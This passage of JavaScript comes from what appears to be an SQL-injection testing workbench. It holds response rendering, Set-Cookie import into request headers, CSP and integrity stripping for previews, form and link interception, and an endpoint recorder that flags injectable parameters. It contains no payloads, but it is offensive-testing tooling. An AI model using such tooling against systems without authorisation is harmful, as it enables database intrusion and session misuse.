          out += `<span class="tok-punct">${ch}</span>`;
          i++;
          continue;
        }
        out += escapeHtml(ch);
        i++;
      }
      return out;
    }

    function highlightCss(src) {
      let s = escapeHtml(src);
      s = s.replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="tok-comment">$1</span>');
      s = s.replace(/(#[0-9a-fA-F]{3,8})\b/g, '<span class="tok-num">$1</span>');
      s = s.replace(/(\.[a-zA-Z_][\w-]*)/g, '<span class="tok-name">$1</span>');
      s = s.replace(/((?:^|[{};\s])[a-zA-Z-]+)(\s*:)/gm, (m, prop, col) => {
        return m.replace(prop.trim(), `<span class="tok-attr">${prop.trim()}</span>`);
      });
      s = s.replace(/(:\s*)([^;{}]+)/g, '$1<span class="tok-str">$2</span>');
      return s;
    }

    function highlightJs(src) {
      let s = escapeHtml(src);
      s = s.replace(/(\/\/[^\n]*|\/\*[\s\S]*?\*\/)/g, '<span class="tok-comment">$1</span>');
      s = s.replace(/(&quot;[\s\S]*?&quot;|'[^']*'|`[^`]*`)/g, '<span class="tok-str">$1</span>');
      s = s.replace(/\b(const|let|var|function|return|if|else|for|while|class|new|this|async|await|import|export|from|default|true|false|null|undefined|typeof|instanceof|try|catch|throw|finally)\b/g,
        '<span class="tok-name">$1</span>');
      s = s.replace(/\b(-?\d+\.?\d*)\b/g, '<span class="tok-num">$1</span>');
      s = s.replace(/\b([a-zA-Z_$][\w$]*)\s*(?=\()/g, '<span class="tok-attr">$1</span>');
      return s;
    }

    /**
     * Split joined Set-Cookie strings.
     * Proxies often join multiple Set-Cookie with commas, but Expires dates also contain commas
     * (e.g. "Thu, 24 Aug 2028"). Split only before a cookie-name= token.
     */
    function splitJoinedSetCookies(raw) {
      const s = String(raw || '').trim();
      if (!s) return [];
      // Cookie-name chars per RFC-ish: token before '=' that is not a date fragment
      return s.split(/,(?=\s*[A-Za-z_][A-Za-z0-9!#$%&'*+\-.^_`|~]*=)/).map((x) => x.trim()).filter(Boolean);
    }

    /** Parse a single Set-Cookie header value into name/value/attrs */
    function parseSetCookieHeader(raw) {
      const s = String(raw || '').trim();
      if (!s) return null;
      const parts = s.split(';');
      const nv = (parts[0] || '').trim();
      const eq = nv.indexOf('=');
      if (eq <= 0) return null;
      return {
        name: nv.slice(0, eq).trim(),
        value: nv.slice(eq + 1).trim(),
        pair: nv.trim(),
        raw: s,
        attrs: parts.slice(1).map((p) => p.trim()).filter(Boolean),
      };
    }

    /** Collect all Set-Cookie entries from a response headers object */
    function getSetCookiesFromHeaders(headers) {
      if (!headers) return [];
      const out = [];
      const seen = new Set();
      for (const [k, v] of Object.entries(headers)) {
        if (k.toLowerCase() !== 'set-cookie') continue;
        const list = Array.isArray(v) ? v : [v];
        list.forEach((item) => {
          // Newlines and/or comma-joined multi-cookies
          String(item).split(/\r?\n/).forEach((line) => {
            splitJoinedSetCookies(line).forEach((piece) => {
              const parsed = parseSetCookieHeader(piece);
              if (!parsed || seen.has(parsed.name)) return;
              seen.add(parsed.name);
              out.push(parsed);
            });
          });
        });
      }
      return out;
    }

    function responseHasSetCookie(resp) {
      return getSetCookiesFromHeaders(resp && resp.headers).length > 0;
    }

    /** Merge selected cookie pairs into request Cookie header */
    function applySetCookiesToRequestHeaders(pairs) {
      if (!pairs || !pairs.length) {
        showToast('No cookies selected');
        return;
      }
      const map = {};
      let cookieHeader = state.headers.find((h) => (h.key || '').toLowerCase() === 'cookie');
      if (cookieHeader && cookieHeader.value) {
        String(cookieHeader.value).split(';').forEach((part) => {
          const t = part.trim();
          const eq = t.indexOf('=');
          if (eq > 0) map[t.slice(0, eq).trim()] = t.slice(eq + 1).trim();
        });
      }
      pairs.forEach((pair) => {
        const eq = pair.indexOf('=');
        if (eq > 0) map[pair.slice(0, eq).trim()] = pair.slice(eq + 1).trim();
      });
      const newVal = Object.entries(map).map(([k, v]) => `${k}=${v}`).join('; ');
      if (cookieHeader) {
        cookieHeader.value = newVal;
      } else {
        state.headers.push({ key: 'Cookie', value: newVal, persist: false });
      }
      if (typeof savePersistedHeaders === 'function') savePersistedHeaders();
      if (typeof renderHeaders === 'function') renderHeaders();
      if (typeof openHeadersSettings === 'function') openHeadersSettings();
      showToast(`Added ${pairs.length} cookie(s) to Cookie header`, 'success');
    }

    function renderCookieImportPanel(headers) {
      const cookies = getSetCookiesFromHeaders(headers);
      if (!cookies.length) return '';
      const items = cookies.map((c, i) => `
        <label class="cookie-import-item selected" data-idx="${i}">
          <input type="checkbox" checked data-pair="${escapeHtml(c.pair)}" />
          <span>
            <span class="ci-pair">${escapeHtml(c.pair)}</span>
            ${c.attrs.length ? `<span class="ci-attrs">${escapeHtml(c.attrs.join(' · '))}</span>` : ''}
          </span>
        </label>
      `).join('');
      // Default CLOSED — opens via Set-Cookie row click or history neon badge
      return `
        <div class="cookie-import-panel" id="cookieImportPanel">
          <div class="cookie-import-title">
            <span style="width:8px;height:8px;border-radius:50%;background:#ffd93d;box-shadow:0 0 8px #ffd93d;display:inline-block;"></span>
            <span>Set-Cookie — pick which to add as request Cookie</span>
            <button type="button" class="ci-close" id="cookieImportClose" title="Close">×</button>
          </div>
          <div class="cookie-import-list" id="cookieImportList">${items}</div>
          <div class="cookie-import-actions">
            <button type="button" class="btn btn-sm btn-ghost" id="cookieImportSelectAll">All</button>
            <button type="button" class="btn btn-sm btn-ghost" id="cookieImportSelectNone">None</button>
            <button type="button" class="btn btn-sm btn-primary" id="cookieImportApply">Add selected → Headers</button>
          </div>
        </div>
      `;
    }

    function openCookieImportPanel() {
      const panel = $('#cookieImportPanel');
      if (!panel) {
        showToast('No Set-Cookie in this response');
        return;
      }
      panel.classList.add('open');
      panel.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
    }
    function closeCookieImportPanel() {
      $('#cookieImportPanel')?.classList.remove('open');
    }

    function bindCookieImportPanel() {
      const panel = $('#cookieImportPanel');
      if (!panel) return;
      panel.querySelectorAll('.cookie-import-item').forEach((el) => {
        const cb = el.querySelector('input');
        const sync = () => el.classList.toggle('selected', !!cb?.checked);
        cb?.addEventListener('change', sync);
      });
      $('#cookieImportClose')?.addEventListener('click', closeCookieImportPanel);
      $('#cookieImportSelectAll')?.addEventListener('click', () => {
        panel.querySelectorAll('input[type=checkbox]').forEach((cb) => {
          cb.checked = true;
          cb.closest('.cookie-import-item')?.classList.add('selected');
        });
      });
      $('#cookieImportSelectNone')?.addEventListener('click', () => {
        panel.querySelectorAll('input[type=checkbox]').forEach((cb) => {
          cb.checked = false;
          cb.closest('.cookie-import-item')?.classList.remove('selected');
        });
      });
      $('#cookieImportApply')?.addEventListener('click', () => {
        const pairs = [...panel.querySelectorAll('input[type=checkbox]:checked')]
          .map((cb) => cb.dataset.pair)
          .filter(Boolean);
        applySetCookiesToRequestHeaders(pairs);
        closeCookieImportPanel();
      });
      // Click Set-Cookie table rows to open panel
      metaTableWrap.querySelectorAll('tr.set-cookie-row').forEach((row) => {
        row.addEventListener('click', () => openCookieImportPanel());
      });
    }

    function highlightHeadersTable(headers) {
      const CATEGORIES = {
        security: {
          keys: ['content-security-policy', 'x-frame-options', 'x-xss-protection', 'x-content-type-options',
            'strict-transport-security', 'referrer-policy', 'permissions-policy', 'cross-origin-opener-policy',
            'cross-origin-resource-policy', 'cross-origin-embedder-policy'],
          badge: 'security', label: 'Security',
        },
        auth: {
          keys: ['set-cookie', 'cookie', 'authorization', 'www-authenticate', 'proxy-authenticate',
            'proxy-authorization', 'x-csrf-token', 'x-xsrf-token'],
          badge: 'auth', label: 'Auth',
        },
        cache: {
          keys: ['cache-control', 'etag', 'last-modified', 'expires', 'age', 'pragma', 'vary'],
          badge: 'cache', label: 'Cache',
        },
        content: {
          keys: ['content-type', 'content-length', 'content-encoding', 'content-language',
            'content-disposition', 'transfer-encoding', 'accept-ranges'],
          badge: 'content', label: 'Content',
        },
        server: {
          keys: ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version', 'via', 'date'],
          badge: 'server', label: 'Server',
        },
        cors: {
          keys: ['access-control-allow-origin', 'access-control-allow-methods', 'access-control-allow-headers',
            'access-control-allow-credentials', 'access-control-expose-headers', 'access-control-max-age'],
          badge: 'cors', label: 'CORS',
        },
      };

      function categorize(key) {
        const lk = key.toLowerCase();
        for (const [cat, info] of Object.entries(CATEGORIES)) {
          if (info.keys.includes(lk)) return { cat, ...info };
        }
        if (lk.startsWith('x-')) return { cat: 'server', badge: 'server', label: 'Custom' };
        return null;
      }

      function formatValue(key, val) {
        const s = String(val);
        const lk = key.toLowerCase();
        if (lk === 'set-cookie' || lk === 'cookie') {
          return `<span class="meta-val-cookie">${escapeHtml(s)}</span>`;
        }
        if (lk === 'location' || lk.includes('url')) {
          return `<span class="meta-val-url">${escapeHtml(s)}</span>`;
        }
        if (lk === 'content-length' || lk === 'age' || /^\d+$/.test(s.trim())) {
          return `<span class="meta-val-num">${escapeHtml(s)}</span>`;
        }
        return escapeHtml(s);
      }

      let rows = '';
      for (const [k, v] of Object.entries(headers || {})) {
        const info = categorize(k);
        const rowClass = info ? `meta-cat-${info.cat}` : '';
        const badge = info
          ? `<span class="meta-badge ${info.badge}">${info.label}</span>`
          : '';
        const isSetCookie = k.toLowerCase() === 'set-cookie';
        const scClass = isSetCookie ? ' set-cookie-row' : '';
        rows += `<tr class="${rowClass}${scClass}" title="${isSetCookie ? 'Click to import cookies' : ''}"><th><span class="meta-key">${escapeHtml(k)}</span>${badge}</th><td>${formatValue(k, v)}${isSetCookie ? ' <span class="meta-badge auth">click to import</span>' : ''}</td></tr>`;
      }
      return rows;
    }

    // ===== Night Protect config (localStorage) =====
    const NP_KEY = 'sqli-workbench-nightprotect';
    const NP_DEFAULTS = {
      defaultMode: 1,
      colorTarget: 'bright', // 'white' | 'bright'
      brightThresh: 78,      // % luminance 0-100
      dimWhite: 70,          // % strength for near-white
      dimColor: 45,          // % strength for other bright hues (same-family)
      minW: 120,
      minH: 48,
      minArea: 18000,
      fixText: true,
    };

    function loadNpConfig() {
      try {
        return { ...NP_DEFAULTS, ...JSON.parse(localStorage.getItem(NP_KEY) || '{}') };
      } catch { return { ...NP_DEFAULTS }; }
    }
    function saveNpConfig(cfg) {
      try { localStorage.setItem(NP_KEY, JSON.stringify(cfg)); } catch {}
    }
    let npConfig = loadNpConfig();

    function syncNpSettingsUI() {
      const set = (id, val) => { const el = $('#' + id); if (el) el.value = val; };
      set('npDefaultMode', npConfig.defaultMode);
      set('npColorTarget', npConfig.colorTarget);
      set('npBrightThresh', npConfig.brightThresh);
      set('npDimWhite', npConfig.dimWhite);
      set('npDimColor', npConfig.dimColor);
      set('npMinW', npConfig.minW);
      set('npMinH', npConfig.minH);
      set('npMinArea', npConfig.minArea);
      set('npFixText', npConfig.fixText ? '1' : '0');
      const bl = $('#npBrightLabel'); if (bl) bl.textContent = npConfig.brightThresh + '%';
      const dw = $('#npDimWhiteLabel'); if (dw) dw.textContent = npConfig.dimWhite + '%';
      const dc = $('#npDimColorLabel'); if (dc) dc.textContent = npConfig.dimColor + '%';
    }

    function bindNpSettingsUI() {
      const persist = () => {
        npConfig = {
          defaultMode: +($('#npDefaultMode')?.value ?? npConfig.defaultMode),
          colorTarget: $('#npColorTarget')?.value || npConfig.colorTarget,
          brightThresh: +($('#npBrightThresh')?.value ?? npConfig.brightThresh),
          dimWhite: +($('#npDimWhite')?.value ?? npConfig.dimWhite),
          dimColor: +($('#npDimColor')?.value ?? npConfig.dimColor),
          minW: +($('#npMinW')?.value ?? npConfig.minW),
          minH: +($('#npMinH')?.value ?? npConfig.minH),
          minArea: +($('#npMinArea')?.value ?? npConfig.minArea),
          fixText: ($('#npFixText')?.value ?? '1') === '1',
        };
        saveNpConfig(npConfig);
        syncNpSettingsUI();
        // live re-apply if currently protecting
        if (state.nightProtectMode > 0 && state.activeHistoryId != null) {
          const item = state.history.find(h => h.id === state.activeHistoryId);
          if (item) displayResponse(item.response, item.url);
        }
      };
      ['npDefaultMode', 'npColorTarget', 'npBrightThresh', 'npDimWhite', 'npDimColor',
        'npMinW', 'npMinH', 'npMinArea', 'npFixText'].forEach((id) => {
        const el = $('#' + id);
        if (!el) return;
        el.addEventListener('input', persist);
        el.addEventListener('change', persist);
      });
      const reset = $('#npResetBtn');
      if (reset) {
        reset.addEventListener('click', () => {
          npConfig = { ...NP_DEFAULTS };
          saveNpConfig(npConfig);
          syncNpSettingsUI();
          showToast('Night Protect settings reset', 'success');
        });
      }
    }

    /**
     * Night Protect modes:
     *  1 = soft  — page-level dark wash
     *  2 = strict — soft + JS dims large bright surfaces in-family (configurable)
     */
    function applyNightProtect(html, mode) {
      const cfg = npConfig || loadNpConfig();
      const softCss = `<style id="sqli-night-protect">
html, body {
  background-color: #0c0c10 !important;
  color: #e4e4ea !important;
}
img, video, canvas { opacity: 0.9; }
[style*="background:#fff"], [style*="background: #fff"],
[style*="background:#ffffff"], [style*="background: #ffffff"],
[style*="background:white"], [style*="background: white"],
[style*="background-color:#fff"], [style*="background-color: #fff"],
[style*="background-color:#ffffff"], [style*="background-color:white"],
[style*="background:#fafafa"], [style*="background:#f5f5f5"],
[style*="background:#f8f9fa"], [style*="background:#eee"] {
  background-color: #1a1a22 !important;
  color: #e4e4ea !important;
}
</style>`;

      const cfgJson = JSON.stringify({
        colorTarget: cfg.colorTarget || 'bright',
        brightThresh: (cfg.brightThresh != null ? cfg.brightThresh : 78) / 100,
        dimWhite: (cfg.dimWhite != null ? cfg.dimWhite : 70) / 100,
        dimColor: (cfg.dimColor != null ? cfg.dimColor : 45) / 100,
        minW: cfg.minW || 120,
        minH: cfg.minH || 48,
        minArea: cfg.minArea || 18000,
        fixText: cfg.fixText !== false,
      });

      const strictScript = mode >= 2 ? `<script id="sqli-night-strict">
(function(){
  if (window.__sqliNightStrict) return;
  window.__sqliNightStrict = true;
  var CFG = ${cfgJson};

  function parseColor(str) {
    if (!str || str === 'transparent' || str === 'rgba(0, 0, 0, 0)') return null;
    var d = document.createElement('div');
    d.style.color = str;
    d.style.display = 'none';
    document.documentElement.appendChild(d);
    var cs = getComputedStyle(d).color;
    d.remove();
    var m = cs && cs.match(/rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/);
    if (!m) return null;
    return { r: +m[1], g: +m[2], b: +m[3] };
  }

  function luminance(c) {
    return (0.2126 * c.r + 0.7152 * c.g + 0.0722 * c.b) / 255;
  }

  function rgbToHsl(c) {
    var r = c.r / 255, g = c.g / 255, b = c.b / 255;
    var max = Math.max(r, g, b), min = Math.min(r, g, b);
    var h = 0, s = 0, l = (max + min) / 2;
    if (max !== min) {
      var d = max - min;
      s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
      if (max === r) h = ((g - b) / d + (g < b ? 6 : 0)) / 6;
      else if (max === g) h = ((b - r) / d + 2) / 6;
      else h = ((r - g) / d + 4) / 6;
    }
    return { h: h, s: s, l: l };
  }

  function hslToRgb(h, s, l) {
    function hue2rgb(p, q, t) {
      if (t < 0) t += 1;
      if (t > 1) t -= 1;
      if (t < 1/6) return p + (q - p) * 6 * t;
      if (t < 1/2) return q;
      if (t < 2/3) return p + (q - p) * (2/3 - t) * 6;
      return p;
    }
    var r, g, b;
    if (s === 0) { r = g = b = l; }
    else {
      var q = l < 0.5 ? l * (1 + s) : l + s - l * s;
      var p = 2 * l - q;
      r = hue2rgb(p, q, h + 1/3);
      g = hue2rgb(p, q, h);
      b = hue2rgb(p, q, h - 1/3);
    }
    return { r: Math.round(r * 255), g: Math.round(g * 255), b: Math.round(b * 255) };
  }

  function isNearWhite(c) {
    if (!c) return false;
    var hsl = rgbToHsl(c);
    return hsl.l > 0.85 && hsl.s < 0.25;
  }

  function shouldDim(c) {
    if (!c) return false;
    var lum = luminance(c);
    if (lum < CFG.brightThresh) return false;
    if (CFG.colorTarget === 'white') return isNearWhite(c);
    return true; // all bright colors
  }

  // Dim within same hue family: lower lightness, slightly reduce saturation
  function dimInFamily(c, strength) {
    var hsl = rgbToHsl(c);
    var newL = hsl.l * (1 - strength * 0.85);
    // floor so we never go pure black
    newL = Math.max(0.12, newL);
    var newS = hsl.s * (1 - strength * 0.35);
    return hslToRgb(hsl.h, newS, newL);
  }

  function lightenText(c) {
    if (!c || luminance(c) > 0.65) return { r: 228, g: 228, b: 234 };
    if (luminance(c) > 0.45) return c;
    return {
      r: Math.min(255, Math.round(c.r + (228 - c.r) * 0.75)),
      g: Math.min(255, Math.round(c.g + (228 - c.g) * 0.75)),
      b: Math.min(255, Math.round(c.b + (228 - c.b) * 0.75))
    };
  }

  function cssRgb(c) { return 'rgb(' + c.r + ',' + c.g + ',' + c.b + ')'; }

  function areaOf(el) {
    var r = el.getBoundingClientRect();
    return Math.max(0, r.width) * Math.max(0, r.height);
  }

  function shouldSkip(el) {
    if (!el || el.nodeType !== 1) return true;
    var tag = el.tagName;
    if (/^(SCRIPT|STYLE|LINK|META|BR|HR|SVG|PATH|IMG|VIDEO|CANVAS|IFRAME)$/i.test(tag)) return true;
    var r = el.getBoundingClientRect();
    if (r.width < CFG.minW || r.height < CFG.minH) return true;
    if (areaOf(el) < CFG.minArea) return true;
    return false;
  }

  function process(el) {
    if (shouldSkip(el)) return;
    var cs = getComputedStyle(el);
    var bg = parseColor(cs.backgroundColor);
    if (!shouldDim(bg)) return;

    var strength = isNearWhite(bg) ? CFG.dimWhite : CFG.dimColor;
    var nb = dimInFamily(bg, strength);
    el.style.setProperty('background-color', cssRgb(nb), 'important');

    if (!CFG.fixText) return;

    var color = parseColor(cs.color);
    if (color && luminance(nb) < 0.4 && luminance(color) < 0.4) {
      el.style.setProperty('color', cssRgb(lightenText(color)), 'important');
    } else if (color && luminance(color) > 0.7 && luminance(nb) > 0.55) {
      // still too bright text on bright-ish panel
      var hsl = rgbToHsl(color);
      var darker = hslToRgb(hsl.h, hsl.s, Math.min(hsl.l, 0.25));
      el.style.setProperty('color', cssRgb(darker), 'important');
    }

    var kids = el.children;
    for (var i = 0; i < kids.length; i++) {
      var kid = kids[i];
      if (areaOf(kid) >= CFG.minArea) continue;
      try {
        var kcs = getComputedStyle(kid);
        var kc = parseColor(kcs.color);
        if (kc && luminance(kc) < 0.4 && luminance(nb) < 0.4) {
          kid.style.setProperty('color', cssRgb(lightenText(kc)), 'important');
        }
      } catch (e) {}
    }
  }

  function scan() {
    if (!document.body) return;
    var all = document.body.querySelectorAll('*');
    for (var i = 0; i < all.length; i++) {
      try { process(all[i]); } catch (e) {}
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function(){ setTimeout(scan, 30); });
  } else {
    setTimeout(scan, 30);
  }
  setTimeout(scan, 400);
})();
<\/script>` : '';

      const inject = softCss + strictScript;
      if (/<\/head>/i.test(html)) {
        return html.replace(/<\/head>/i, inject + '</head>');
      }
      if (/<body[^>]*>/i.test(html)) {
        return html.replace(/<body[^>]*>/i, (m) => m + inject);
      }
      return inject + html;
    }

    /**
     * Light prep so site UI JS has a better chance inside srcdoc iframe:
     * - Strip CSP meta (often blocks inline/external scripts in preview)
     * - Drop SRI integrity on script/link (mismatches if anything was rewritten)
     * Does NOT strip or rewrite script bodies — we want menus/tabs/dropdowns to work.
     */
    function prepareHtmlForRender(html) {
      if (!html) return html;
      let out = String(html);
      // <meta http-equiv="Content-Security-Policy" ...>
      out = out.replace(
        /<meta[^>]+http-equiv\s*=\s*["']?Content-Security-Policy["'][^>]*>/gi,
        ''
      );
      // <meta name="Content-Security-Policy" ...> (rare)
      out = out.replace(
        /<meta[^>]+name\s*=\s*["']?Content-Security-Policy["'][^>]*>/gi,
        ''
      );
      // Remove integrity= from script/link so browser won't block after base/proxy tweaks
      out = out.replace(
        /(<script\b[^>]*?)\s+integrity\s*=\s*(["'][^"']*["']|[^\s>]+)/gi,
        '$1'
      );
      out = out.replace(
        /(<link\b[^>]*?)\s+integrity\s*=\s*(["'][^"']*["']|[^\s>]+)/gi,
        '$1'
      );
      return out;
    }

    /**
     * Inject a small script into the rendered HTML that:
     *  - Intercepts <a> clicks → posts URL to parent
     *  - Intercepts form submits → posts correct action/method/body to parent
     * Fixes empty action (about:srcdoc) by resolving against real page URL.
     */
    function injectInteractionBridge(html, pageUrl) {
      const safePage = (pageUrl || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"');
      const bridge = `
<script>
(function(){
  if (window.__sqliBridge) return;
  window.__sqliBridge = true;
  var PAGE_URL = "${safePage}";

  function pageBase() {
    try {
      var b = document.querySelector('base');
      if (b && b.href) return b.href;
    } catch(e) {}
    return PAGE_URL || document.baseURI || '';
  }

  function absUrl(href) {
    var base = pageBase();
    if (!href || href === '') return base;
    try { return new URL(href, base).href; }
    catch(e) { return href; }
  }

  // Track which submit button was clicked (for name=value)
  var lastSubmitter = null;
  document.addEventListener('click', function(e) {
    var t = e.target;
    if (!t) return;
    var btn = t.closest('button, input');
    if (btn && (btn.type === 'submit' || btn.type === 'image' || (btn.tagName === 'BUTTON' && !btn.type))) {
      lastSubmitter = btn;
    }
    // Link clicks
    var a = t.closest('a');
    if (!a || !a.href) return;
    if (e.defaultPrevented || e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
    var href = a.getAttribute('href');
    if (!href || href.charAt(0) === '#' || href.indexOf('javascript:') === 0) return;
    e.preventDefault();
    e.stopPropagation();
    parent.postMessage({
      type: 'sqli-navigate',
      url: absUrl(href),
      method: 'GET',
      post_data: ''
    }, '*');
  }, true);

  function serializeForm(form, submitter) {
    var pairs = [];
    var elements = form.elements;
    for (var i = 0; i < elements.length; i++) {
      var el = elements[i];
      if (!el.name || el.disabled) continue;
      var type = (el.type || '').toLowerCase();
      var tag = el.tagName.toUpperCase();
      if (type === 'file' || type === 'reset' || type === 'button') continue;
      if (type === 'submit' || type === 'image') continue; // handled via submitter
      if ((type === 'checkbox' || type === 'radio') && !el.checked) continue;
      if (tag === 'SELECT' && el.multiple) {
        for (var j = 0; j < el.options.length; j++) {
          if (el.options[j].selected) {
            pairs.push(encodeURIComponent(el.name) + '=' + encodeURIComponent(el.options[j].value));
          }
        }
        continue;
      }
      pairs.push(encodeURIComponent(el.name) + '=' + encodeURIComponent(el.value == null ? '' : el.value));
    }
    if (submitter && submitter.name) {
      pairs.push(encodeURIComponent(submitter.name) + '=' + encodeURIComponent(submitter.value || ''));
    }
    return pairs.join('&');
  }

  document.addEventListener('submit', function(e) {
    var form = e.target;
    if (!form || form.tagName !== 'FORM') return;
    e.preventDefault();
    e.stopPropagation();

    var submitter = e.submitter || lastSubmitter || null;
    lastSubmitter = null;

    // Resolve action: empty / missing → current page URL (NOT about:srcdoc)
    var actionAttr = form.getAttribute('action');
    var formaction = submitter && submitter.getAttribute && submitter.getAttribute('formaction');
    var action = (formaction != null && formaction !== '') ? formaction
               : (actionAttr != null && actionAttr !== '') ? actionAttr
               : PAGE_URL;
    var methodAttr = (submitter && submitter.getAttribute && submitter.getAttribute('formmethod'))
                   || form.getAttribute('method')
                   || 'GET';
    var method = String(methodAttr).toUpperCase();
    if (method !== 'POST' && method !== 'PUT' && method !== 'PATCH') method = 'GET';

    var data = serializeForm(form, submitter);
    var target = absUrl(action);

    if (method === 'GET') {
      if (data) {
        target += (target.indexOf('?') >= 0 ? '&' : '?') + data;
      }
      data = '';
    }

    parent.postMessage({
      type: 'sqli-navigate',
      url: target,
      method: method,
      post_data: data
    }, '*');
  }, true);
})();
<\/script>`;

      if (/<\/body>/i.test(html)) {
        return html.replace(/<\/body>/i, bridge + '</body>');
      }
      return html + bridge;
    }

    // Listen for navigation requests from the rendered iframe
    window.addEventListener('message', (event) => {
      if (!event.data || event.data.type !== 'sqli-navigate') return;
      const { url, method, post_data } = event.data;
      if (!url) return;

      // Record endpoint if recording is ON
      if (state.recording) {
        recordEndpoint(url, method || 'GET', post_data);
      }

      // Update UI fields
      const m = (method || 'GET').toUpperCase();
      urlInput.value = url;
      methodSelect.value = (m === 'POST' || m === 'PUT' || m === 'PATCH') ? 'POST' : 'GET';
      if (typeof updateBodyVisibility === 'function') updateBodyVisibility();

      // POST body goes into Request Body field — NOT payload workbench
      if (m === 'POST' || m === 'PUT' || m === 'PATCH') {
        if (postBodyInput) postBodyInput.value = post_data || '';
      }

      showToast(`Navigating: ${m} ${url.slice(0, 60)}…`);
      sendRequest();
    });

    // ===== Endpoint Recorder =====
    function endpointKey(path, paramNames, method) {
      return `${method || 'GET'}|${path}|${[...paramNames].sort().join('&')}`;
    }

    function parseEndpoint(url, method, postData) {
      try {
        const u = new URL(url, 'http://dummy.local');
        const path = u.pathname || '/';
        const paramNames = [];
        u.searchParams.forEach((_, k) => {
          if (!paramNames.includes(k)) paramNames.push(k);
        });
        // Also parse POST body keys if form-urlencoded
        if (postData && typeof postData === 'string' && postData.includes('=')) {
          try {
            const ps = new URLSearchParams(postData);
            ps.forEach((_, k) => {
              if (!paramNames.includes(k)) paramNames.push(k);
            });
          } catch (_) {}
        }
        return {
          origin: u.origin === 'http://dummy.local' ? '' : u.origin,
          path,
          paramNames,
          sampleUrl: url,
          method: (method || 'GET').toUpperCase(),
        };
      } catch {
        return null;
      }
    }

    function recordEndpoint(url, method, postData) {
      const parsed = parseEndpoint(url, method, postData);
      if (!parsed) return;
      // Only interesting if has query/body params or path looks dynamic
      const key = endpointKey(parsed.path, parsed.paramNames, parsed.method);
      const existing = state.endpoints.find(e => e.key === key);
      if (existing) {
        existing.count += 1;
        existing.sampleUrl = url; // keep latest sample
        renderEndpoints();
        return;
      }
      state.endpoints.push({
        key,
        origin: parsed.origin,
        path: parsed.path,
        paramNames: parsed.paramNames,
        sampleUrl: url,
        method: parsed.method,
        count: 1,
        seenAt: Date.now(),
      });
      renderEndpoints();
      if (parsed.paramNames.length) {
        showToast(`Discovered: ${parsed.path} [${parsed.paramNames.join(', ')}]`, 'success');
      }
    }

    function renderEndpoints() {
      const panel = $('#endpointPanel');
      const list = $('#endpointList');
      const empty = $('#endpointEmpty');
      const countEl = $('#endpointCount');
      if (!panel || !list) return;

      if (state.recording || state.endpoints.length > 0) {
        panel.classList.remove('hidden');
      }
      if (countEl) countEl.textContent = String(state.endpoints.length);

      if (state.endpoints.length === 0) {
        if (empty) {
          empty.style.display = '';
          empty.textContent = state.recording
            ? 'Recording… interact with the rendered page.'
            : 'No endpoints discovered yet.';
        }
        list.innerHTML = '';
        return;
      }
      if (empty) empty.style.display = 'none';

      list.innerHTML = state.endpoints.map((ep, idx) => {
        const params = ep.paramNames.length
          ? ep.paramNames.map(p => `<span class="endpoint-param injectable" title="Injectable param">${escapeHtml(p)}</span>`).join('')
          : `<span class="endpoint-param" title="No query params">no params</span>`;
        return `
          <div class="endpoint-item" data-idx="${idx}" title="Click to load into URL bar">
            <div class="endpoint-path"><span style="color:var(--accent-cyan)">${escapeHtml(ep.method)}</span> ${escapeHtml(ep.path)}</div>
            <div class="endpoint-params">${params}</div>
            <div class="endpoint-meta">seen ×${ep.count} · sample: ${escapeHtml((ep.sampleUrl || '').slice(0, 80))}</div>
          </div>`;
      }).join('');

      list.querySelectorAll('.endpoint-item').forEach(el => {
        el.addEventListener('click', () => {
          const ep = state.endpoints[+el.dataset.idx];
          if (!ep) return;
          // Build URL with $1, $2 placeholders for each param
          let url = (ep.origin || '') + ep.path;
          if (ep.paramNames.length) {
            url += '?' + ep.paramNames.map((p, i) => `${p}=$${i + 1}`).join('&');
          }
          urlInput.value = url;
          methodSelect.value = ep.method === 'POST' ? 'POST' : 'GET';
          // Prefill workbench with sample values as separate lines
          try {
            const u = new URL(ep.sampleUrl);
            const lines = ep.paramNames.map(p => u.searchParams.get(p) || '');
            payloadInput.value = lines.join('\n');
          } catch (_) {}
          if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
          if (typeof updateBodyVisibility === 'function') updateBodyVisibility();
          showToast('Loaded endpoint → URL + $ placeholders', 'success');
        });
      });
    }

    // ===== Tabs =====
    let activeTab = 'rendered';
    $$('.tab-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        $$('.tab-btn').forEach(b => b.classList.remove('active'));
        $$('.tab-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        $(`#tab-${btn.dataset.tab}`).classList.add('active');
        activeTab = btn.dataset.tab;
      });
    });

    // ===== Fullscreen Modal (Expand) =====
    const modalOverlay = $('#modalOverlay');
    const modalBody = $('#modalBody');
    const modalTitle = $('#modalTitle');
    const modalCloseBtn = $('#modalCloseBtn');
    const expandBtn = $('#expandBtn');

    const TAB_TITLES = {
      rendered: 'Rendered View',
      raw: 'Raw Response',
      headers: 'Headers & Metadata',
    };

    function openModal() {
      const title = TAB_TITLES[activeTab] || activeTab;
      modalTitle.innerHTML = `${title} <span>Fullscreen</span>`;
      modalBody.innerHTML = '';

      if (activeTab === 'rendered') {
        const srcdoc = state.lastRenderedHtml || renderedFrame.srcdoc || '';
        if (!srcdoc) {
          modalBody.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--text-muted);font-size:14px;">No rendered content available. Send a request first.</div>';
        } else {
          const iframe = document.createElement('iframe');
          iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-pointer-lock allow-downloads';
          iframe.srcdoc = srcdoc;
          modalBody.appendChild(iframe);
        }
      } else if (activeTab === 'raw') {
        const pre = document.createElement('pre');
        pre.className = 'raw-response';
        pre.style.cssText = 'flex:1;overflow:auto;padding:20px;margin:0;';
        pre.innerHTML = rawResponse.innerHTML || 'No response data.';
        modalBody.appendChild(pre);
      } else if (activeTab === 'headers') {
        const wrap = document.createElement('div');
        wrap.className = 'meta-table-wrap';
        // Clone the current metadata table content
        wrap.innerHTML = metaTableWrap.innerHTML;
        modalBody.appendChild(wrap);
      }

      modalOverlay.classList.add('open');
